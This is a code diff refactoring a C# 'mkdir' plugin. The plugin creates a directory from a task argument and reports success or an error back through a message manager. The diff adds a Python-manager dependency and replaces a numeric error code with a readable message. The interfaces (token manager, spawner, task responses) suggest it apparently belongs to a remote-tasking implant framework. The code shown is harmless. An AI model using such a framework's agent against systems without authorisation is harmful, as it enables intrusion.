@@ -11,7 +11,7 @@ namespace Agent
         public string Name => "mkdir";
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
@@ -23,9 +23,9 @@ namespace Agent
             {
                 if (args.ContainsKey("path"))
                 {
-                    DirectoryInfo dir = Directory.CreateDirectory((args["path"]).Replace("\"", ""));
+                    DirectoryInfo dir = Directory.CreateDirectory(args["path"].Replace("\"", ""));
 
-                    await messageManager.AddResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
                     {
                         completed = true,
                         user_output = "Created directory " + dir.FullName,
@@ -34,10 +34,10 @@ namespace Agent
                 }
                 else
                 {
-                    await messageManager.AddResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
                     {
                         completed = true,
-                        process_response = new Dictionary<string, string> { { "message", "0x2A" } },
+                        user_output = "No path provided.",
                         task_id = job.task.id,
                         status = "error"
                     });
